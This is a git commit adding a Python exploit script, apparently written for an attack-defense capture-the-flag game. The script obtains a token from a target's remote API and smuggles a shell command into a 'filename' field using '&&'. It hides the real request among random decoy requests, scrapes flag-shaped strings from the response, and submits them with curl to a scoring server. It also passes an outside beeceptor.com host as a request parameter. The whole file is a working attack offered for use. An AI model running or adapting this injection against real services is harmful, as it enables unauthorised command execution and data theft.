891a1dbd76ea89971532b0d8c5c7151733b5af76
greenhazz <timofey@gulenok.ru>
2024-12-30 20:42:34 +0300

    command injection sploit

---
+++ greenade-pilot/Sploits/command_injection.py
@@ -0,0 +1,30 @@
+#command injection + side-effect
+import requests
+import sys
+import os
+import re
+import random
+ip = sys.argv[1]
+
+cmd_payload = "cowsay ghz is leet"
+with requests.session() as sess:
+    order = random.randint(1,20)
+    for i in range(0,20):
+        if i == order:
+            token = requests.get(f"http://{ip}:8001/api/v1/remote/token", params={"login":"trembolone", "password": "koly v ochko", "dept": "mp44a9ba36875b5f5fb3.free.beeceptor.com"})
+            res = requests.post(f"http://{ip}:8001/api/v1/command/exec", json={
+  "token": token.text.replace('"', ""),
+  "conn_data": {"addr": 'trembolone', "filename": "leakage_log.log && " + cmd_payload, "log_request": True}
+})          
+            print(res.text)
+            data = re.findall(r"[A-Z0-9]{31}=", res.text)
+            print(str(data))
+
+
+            stdout = os.popen(f"""curl -s -H 'X-Team-Token: fd0d0f0d5f004d661' -X PUT -d '{str(data).replace("'", '"')}' http://10.66.66.2/flags""")
+            print(stdout.read())
+        else:
+            requests.post(f"http://{ip}:8001/api/v1/command/exec", json={
+  "token": "string",
+  "conn_data": {"addr": 'nyc_office', "filename": "leakage_log.log"}
+})
